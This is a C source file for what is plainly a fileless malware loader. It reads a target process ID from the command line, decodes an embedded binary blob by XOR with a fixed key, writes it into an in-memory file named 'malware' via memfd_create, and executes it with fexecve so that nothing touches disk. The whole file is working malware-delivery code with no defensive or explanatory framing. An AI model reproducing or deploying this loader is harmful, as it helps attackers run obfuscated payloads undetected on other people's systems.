#include <stdio.h>
#include <syscall.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/stat.h>

extern unsigned char _binary_mlw_start[];
extern unsigned char _binary_mlw_end[];

int
main(int argc, char *argv[])
{
	if (argc < 2) {
		printf("need pid\n");
		return 1;
	}

	unsigned char *start;
	start = _binary_mlw_start;

	unsigned char *end;
	end = _binary_mlw_end;

	printf("pid: %s\n", argv[1]);

	int res;

	int file;
	file = syscall(SYS_memfd_create, "malware", 0);
	if (file == -1) {
		printf("failed to create a memory file, err: %s\n", strerror(errno));
		return 1;
	}

	const unsigned char key = 9;

	size_t size;
	size = end - start;
	for (size_t i = 0; i < size; ++i) {
		start[i] ^= key;
	}

	ssize_t bytes;
	bytes = write(file, start, size);
	if (bytes == -1) {
		printf("failed to append the binary, err: %s\n", strerror(errno));
		return 1;
	}

	char *args[] = { "", argv[1], NULL };
	char *envp[] = { NULL };
	res = fexecve(file, args, envp);
	if (res == -1) {
		printf("failed to load the malware, err: %s\n", strerror(errno));
		return 1;
	}

	return 0;
}
